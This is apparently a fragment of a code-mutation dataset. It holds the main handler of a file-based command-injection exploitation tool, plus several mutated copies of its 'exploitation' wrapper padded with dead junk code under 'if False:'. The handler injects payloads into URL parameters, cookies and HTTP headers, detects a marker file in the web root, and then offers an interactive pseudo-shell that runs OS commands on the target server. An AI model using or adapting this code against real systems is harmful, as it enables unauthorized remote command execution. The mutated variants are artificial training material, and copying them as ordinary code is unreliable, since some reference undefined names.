            "def fb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    shell = False\n    counter = 1\n    vp_flag = True\n    exit_loops = False\n    no_result = True\n    is_encoded = False\n    stop_injection = False\n    call_tmp_based = False\n    next_attack_vector = False\n    export_injection_info = False\n    tmp_path = check_tmp_path(url, timesec, filename, http_request_method, url_time_response)\n    if not settings.LOAD_SESSION or settings.RETEST == True:\n        TAG = ''.join((random.choice(string.ascii_uppercase) for i in range(6)))\n        if settings.VERBOSITY_LEVEL != 0:\n            debug_msg = \"Using '\" + settings.WEB_ROOT + \"' as web server document root.\"\n            print(settings.print_debug_msg(debug_msg))\n        info_msg = \"Trying to create a file in '\" + settings.WEB_ROOT\n        info_msg += \"' for command execution output. \"\n        print(settings.print_info_msg(info_msg))\n    i = 0\n    total = len(settings.WHITESPACES) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)\n    alter_shell = menu.options.alter_shell\n    for whitespace in settings.WHITESPACES:\n        for prefix in settings.PREFIXES:\n            for suffix in settings.SUFFIXES:\n                for separator in settings.SEPARATORS:\n                    settings.DETECTION_PHASE = True\n                    settings.EXPLOITATION_PHASE = False\n                    if settings.LOAD_SESSION:\n                        try:\n                            settings.FILE_BASED_STATE = True\n                            (url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable) = session_handler.injection_point_exportation(url, http_request_method)\n                            checks.check_for_stored_tamper(payload)\n                            OUTPUT_TEXTFILE = TAG + '.txt'\n                            session_handler.notification(url, technique, injection_type)\n                            if technique == 'tempfile-based injection technique':\n                                tfb_handler.exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response)\n                        except TypeError:\n                            err_msg = \"An error occurred while accessing session file ('\"\n                            err_msg += settings.SESSION_FILE + \"'). \"\n                            err_msg += \"Use the '--flush-session' option.\"\n                            print(settings.print_critical_msg(err_msg))\n                            raise SystemExit()\n                    if settings.RETEST == True:\n                        settings.RETEST = False\n                        from src.core.injections.results_based.techniques.classic import cb_handler\n                        cb_handler.exploitation(url, timesec, filename, http_request_method, injection_type, technique)\n                    if not settings.LOAD_SESSION:\n                        i = i + 1\n                        OUTPUT_TEXTFILE = TAG + '.txt'\n                        combination = prefix + separator\n                        if combination in settings.JUNK_COMBINATION:\n                            prefix = ''\n                        try:\n                            if alter_shell:\n                                payload = fb_payloads.decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE)\n                            else:\n                                payload = fb_payloads.decision(separator, TAG, OUTPUT_TEXTFILE)\n                            payload = parameters.prefixes(payload, prefix)\n                            payload = parameters.suffixes(payload, suffix)\n                            payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)\n                            payload = checks.perform_payload_modification(payload)\n                            if settings.VERBOSITY_LEVEL != 0:\n                                payload_msg = payload.replace('\\n', '\\\\n')\n                                print(settings.print_payload(payload_msg))\n                            if settings.COOKIE_INJECTION == True:\n                                vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)\n                                response = fb_injector.cookie_injection_test(url, vuln_parameter, payload)\n                            elif settings.USER_AGENT_INJECTION == True:\n                                vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)\n                                response = fb_injector.user_agent_injection_test(url, vuln_parameter, payload)\n                            elif settings.REFERER_INJECTION == True:\n                                vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)\n                                response = fb_injector.referer_injection_test(url, vuln_parameter, payload)\n                            elif settings.HOST_INJECTION == True:\n                                vuln_parameter = parameters.specify_host_parameter(menu.options.host)\n                                response = fb_injector.host_injection_test(url, vuln_parameter, payload)\n                            elif settings.CUSTOM_HEADER_INJECTION == True:\n                                vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)\n                                response = fb_injector.custom_header_injection_test(url, vuln_parameter, payload)\n                            else:\n                                (response, vuln_parameter) = fb_injector.injection_test(payload, http_request_method, url)\n                            output = fb_injector.injection_output(url, OUTPUT_TEXTFILE, timesec)\n                            time.sleep(timesec)\n                            try:\n                                request = _urllib.request.Request(output)\n                                headers.do_check(request)\n                                headers.check_http_traffic(request)\n                                if menu.options.proxy or menu.options.ignore_proxy:\n                                    response = proxy.use_proxy(request)\n                                elif menu.options.tor:\n                                    response = tor.use_tor(request)\n                                else:\n                                    response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)\n                                if type(response) is bool:\n                                    html_data = ''\n                                else:\n                                    html_data = checks.page_encoding(response, action='decode')\n                                shell = re.findall('' + TAG + '', str(html_data))\n                                if len(shell) != 0 and shell[0] == TAG and (not settings.VERBOSITY_LEVEL != 0):\n                                    percent = settings.info_msg\n                                    info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                    sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                    sys.stdout.flush()\n                                if len(shell) == 0:\n                                    raise _urllib.error.HTTPError(url, 404, 'Error', {}, None)\n                            except _urllib.error.HTTPError as e:\n                                if str(e.getcode()) == settings.NOT_FOUND_ERROR:\n                                    percent = i * 100 / total\n                                    float_percent = '{0:.1f}'.format(round(i * 100 / (total * 1.0), 2))\n                                    if call_tmp_based == True:\n                                        exit_loops = True\n                                        tmp_path = os.path.split(menu.options.file_dest)[0] + '/'\n                                        tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response)\n                                        raise\n                                    elif i == int(menu.options.failed_tries) and no_result == True or i == total:\n                                        if i == total:\n                                            if finalize(exit_loops, no_result, float_percent, injection_type, technique):\n                                                continue\n                                            else:\n                                                raise\n                                        tmp_path = check_tmp_path(url, timesec, filename, http_request_method, url_time_response)\n                                        sys.stdout.write('\\r')\n                                        message = \"It seems that you don't have permissions to \"\n                                        message += \"read and/or write files in '\" + settings.WEB_ROOT + \"'.\"\n                                        if not menu.options.web_root:\n                                            message += \" You are advised to rerun with option '--web-root'.\"\n                                        while True:\n                                            message = message + \"\\nDo you want to use the temporary directory ('\" + tmp_path + \"')? [Y/n] > \"\n                                            tmp_upload = common.read_input(message, default='Y', check_batch=True)\n                                            if tmp_upload in settings.CHOICE_YES:\n                                                exit_loops = True\n                                                settings.TEMPFILE_BASED_STATE = True\n                                                call_tfb = tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response)\n                                                if call_tfb != False:\n                                                    return True\n                                                elif no_result == True:\n                                                    return False\n                                                else:\n                                                    return True\n                                            elif tmp_upload in settings.CHOICE_NO:\n                                                break\n                                            elif tmp_upload in settings.CHOICE_QUIT:\n                                                print(settings.SINGLE_WHITESPACE)\n                                                raise\n                                            else:\n                                                common.invalid_option(tmp_upload)\n                                                pass\n                                        continue\n                                    elif finalize(exit_loops, no_result, float_percent, injection_type, technique):\n                                        continue\n                                    else:\n                                        raise\n                                elif str(e.getcode()) == settings.UNAUTHORIZED_ERROR:\n                                    err_msg = 'Authorization required!'\n                                    print(settings.print_critical_msg(err_msg) + '\\n')\n                                    raise SystemExit()\n                                elif str(e.getcode()) == settings.FORBIDDEN_ERROR:\n                                    err_msg = \"You don't have permission to access this page.\"\n                                    print(settings.print_critical_msg(err_msg) + '\\n')\n                                    raise SystemExit()\n                        except (KeyboardInterrupt, SystemExit):\n                            if 'vuln_parameter' in locals():\n                                delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                            raise\n                        except _urllib.error.URLError as e:\n                            warn_msg = \"It seems that you don't have permissions to \"\n                            warn_msg += \"read and/or write files in '\" + settings.WEB_ROOT + \"'.\"\n                            sys.stdout.write('\\r' + settings.print_warning_msg(warn_msg))\n                            err_msg = str(e).replace(': ', ' (') + ').'\n                            if settings.VERBOSITY_LEVEL >= 2:\n                                print(settings.SINGLE_WHITESPACE)\n                            print(settings.print_critical_msg(err_msg))\n                            if not menu.options.web_root:\n                                custom_web_root(url, timesec, filename, http_request_method, url_time_response)\n                            continue\n                        except:\n                            raise\n                    if shell:\n                        settings.FILE_BASED_STATE = True\n                        found = True\n                        no_result = False\n                        settings.DETECTION_PHASE = False\n                        settings.EXPLOITATION_PHASE = True\n                        if not settings.VERBOSITY_LEVEL != 0 and (not menu.options.alter_shell) and (not next_attack_vector):\n                            next_attack_vector = True\n                        if settings.COOKIE_INJECTION == True:\n                            header_name = ' cookie'\n                            found_vuln_parameter = vuln_parameter\n                            the_type = ' parameter'\n                        elif settings.USER_AGENT_INJECTION == True:\n                            header_name = ' User-Agent'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.REFERER_INJECTION == True:\n                            header_name = ' Referer'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.HOST_INJECTION == True:\n                            header_name = 'Host'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.CUSTOM_HEADER_INJECTION == True:\n                            header_name = settings.SINGLE_WHITESPACE + settings.CUSTOM_HEADER_NAME\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        else:\n                            header_name = ''\n                            the_type = ' parameter'\n                            if not settings.USER_DEFINED_POST_DATA:\n                                found_vuln_parameter = parameters.vuln_GET_param(url)\n                            else:\n                                found_vuln_parameter = vuln_parameter\n                        if len(found_vuln_parameter) != 0:\n                            found_vuln_parameter = \" '\" + found_vuln_parameter + Style.RESET_ALL + Style.BRIGHT + \"'\"\n                        if export_injection_info == False:\n                            export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)\n                        if vp_flag == True:\n                            vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)\n                        logs.update_payload(filename, counter, payload)\n                        counter = counter + 1\n                        if not settings.LOAD_SESSION:\n                            if settings.VERBOSITY_LEVEL == 0:\n                                print(settings.SINGLE_WHITESPACE)\n                            else:\n                                checks.total_of_requests()\n                        info_msg = settings.CHECKING_PARAMETER + ' appears to be injectable via '\n                        info_msg += '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.'\n                        print(settings.print_bold_info_msg(info_msg))\n                        sub_content = str(checks.url_decode(payload))\n                        print(settings.print_sub_content(sub_content))\n                        if not settings.LOAD_SESSION:\n                            session_handler.injection_point_importation(url, technique, injection_type, separator, shell[0], vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response=0, timesec=0, how_long=0, output_length=0, is_vulnerable=menu.options.level)\n                        else:\n                            whitespace = settings.WHITESPACES[0]\n                            settings.LOAD_SESSION = False\n                        new_line = True\n                        if settings.ENUMERATION_DONE == True:\n                            while True:\n                                message = 'Do you want to ignore stored session and enumerate again? [y/N] > '\n                                enumerate_again = common.read_input(message, default='N', check_batch=True)\n                                if enumerate_again in settings.CHOICE_YES:\n                                    if not menu.options.ignore_session:\n                                        menu.options.ignore_session = True\n                                    fb_enumeration.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    break\n                                elif enumerate_again in settings.CHOICE_NO:\n                                    new_line = False\n                                    break\n                                elif file_access_again in settings.CHOICE_QUIT:\n                                    delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(enumerate_again)\n                                    pass\n                        elif menu.enumeration_options():\n                            fb_enumeration.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                        if settings.FILE_ACCESS_DONE == True:\n                            while True:\n                                message = 'Do you want to ignore stored session and access files again? [y/N] > '\n                                file_access_again = common.read_input(message, default='N', check_batch=True)\n                                if file_access_again in settings.CHOICE_YES:\n                                    if not menu.options.ignore_session:\n                                        menu.options.ignore_session = True\n                                    fb_file_access.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    break\n                                elif file_access_again in settings.CHOICE_NO:\n                                    break\n                                elif file_access_again in settings.CHOICE_QUIT:\n                                    delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(enumerate_again)\n                                    pass\n                        elif menu.file_access_options():\n                            fb_file_access.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                        if menu.options.os_cmd:\n                            fb_enumeration.single_os_cmd_exec(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                            delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                        try:\n                            checks.alert()\n                            go_back = False\n                            go_back_again = False\n                            while True:\n                                delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                if go_back == True:\n                                    break\n                                message = settings.CHECKING_PARAMETER + ' is vulnerable. Do you want to prompt for a pseudo-terminal shell? [Y/n] > '\n                                if settings.CRAWLING:\n                                    settings.CRAWLED_URLS_INJECTED.append(_urllib.parse.urlparse(url).netloc)\n                                if not settings.STDIN_PARSING:\n                                    gotshell = common.read_input(message, default='Y', check_batch=True)\n                                else:\n                                    gotshell = common.read_input(message, default='n', check_batch=True)\n                                if gotshell in settings.CHOICE_YES:\n                                    print(settings.OS_SHELL_TITLE)\n                                    if settings.READLINE_ERROR:\n                                        checks.no_readline_module()\n                                    while True:\n                                        if not settings.READLINE_ERROR:\n                                            checks.tab_autocompleter()\n                                        sys.stdout.write(settings.OS_SHELL)\n                                        cmd = common.read_input(message='', default='os_shell', check_batch=True)\n                                        cmd = checks.escaped_cmd(cmd)\n                                        if cmd.lower() in settings.SHELL_OPTIONS:\n                                            (go_back, go_back_again) = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE)\n                                            if go_back and go_back_again == False:\n                                                break\n                                            if go_back and go_back_again:\n                                                return True\n                                        else:\n                                            time.sleep(timesec)\n                                            response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                            if menu.options.ignore_session or session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:\n                                                shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)\n                                                shell = ''.join((str(p) for p in shell))\n                                                if not menu.options.ignore_session:\n                                                    session_handler.store_cmd(url, cmd, shell, vuln_parameter)\n                                            else:\n                                                shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)\n                                            if shell or shell != '':\n                                                logs.executed_command(filename, cmd, shell)\n                                                print(settings.command_execution_output(shell))\n                                            else:\n                                                err_msg = common.invalid_cmd_output(cmd)\n                                                print(settings.print_critical_msg(err_msg))\n                                elif gotshell in settings.CHOICE_NO:\n                                    if checks.next_attack_vector(technique, go_back) == True:\n                                        break\n                                    elif no_result == True:\n                                        return False\n                                    else:\n                                        return True\n                                elif gotshell in settings.CHOICE_QUIT:\n                                    delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(gotshell)\n                                    pass\n                        except KeyboardInterrupt:\n                            delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                            raise\n    if no_result == True:\n        if settings.VERBOSITY_LEVEL == 0:\n            print(settings.SINGLE_WHITESPACE)\n        return False\n    else:\n        sys.stdout.write('\\r')\n        sys.stdout.flush()"
        ]
    },
    {
        "func_name": "exploitation",
        "original": "def exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):\n    if fb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique) == False:\n        return False",
        "mutated": [
            "def exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):\n    if False:\n        i = 10\n    if fb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique) == False:\n        return False",
            "def exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if fb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique) == False:\n        return False",
            "def exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if fb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique) == False:\n        return False",
            "def exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if fb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique) == False:\n        return False",
            "def exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if fb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique) == False:\n        return False"
        ]
    }
]